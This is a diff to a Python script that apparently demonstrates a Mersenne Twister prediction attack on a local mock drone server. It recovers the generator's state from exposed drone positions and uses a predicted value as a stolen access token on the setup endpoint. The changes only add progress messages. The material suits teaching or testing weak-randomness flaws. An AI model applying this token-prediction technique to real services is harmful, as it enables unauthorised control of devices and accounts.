@@ -34,6 +34,7 @@ while True:
     while True:
         # random assumption that the user has changed the drones
         if random.randint(1, 2) == 1:
+            print("! User changed drone positions !")
             user_changed_drones(user_token)
 
         # Take the drone positions
@@ -52,8 +53,10 @@ while True:
             break
         # sleep would be recommended in attack senaroios as you dont what to flood the server with requests from the same user
         # time.sleep()
+        print("- No change detected -")
 
     # import crack
+    print("- Adding list of drone positions -")
     for x in response_json["Drone_positions"]:
         done = mt_cracker.crack(x)
         if done:
@@ -62,7 +65,7 @@ while True:
         response_json_copy = response_json
         break
 
-
+print("- Finished cracking -")
 # Once this is done we have a system for cracking setup
 # now one we can steal access codes.
 cracked_list = list()
@@ -75,8 +78,10 @@ while True:
     ):  # 1 in 100 chance that a new access token might be created
         user_token = token()
         user_changed_drones(user_token)
+        print("! New user logged in !")
     while True:
         if random.randint(1, 2) == 1:
+            print("! User changed drone positions !")
             user_changed_drones(user_token)
 
         response = requests.get("http://127.0.0.1:8000/drone/getalldronepositions")
@@ -87,6 +92,7 @@ while True:
         ):
             break
 
+    print("- checking differences in predicted list and actual positions -")
     cracked_list = list()
     for i in range(len(response_json["Drone_positions"])):
         cracked_list.append(mt_cracker.get_next())
@@ -97,6 +103,7 @@ while True:
     response_json_copy = response_json
     # time.sleep(5.0)
 
+print("- found access token -")
 attempted_access_token = cracked_list[0]
 response = requests.get(
     "http://127.0.0.1:8000/drone/setup?access_token=" + str(attempted_access_token)
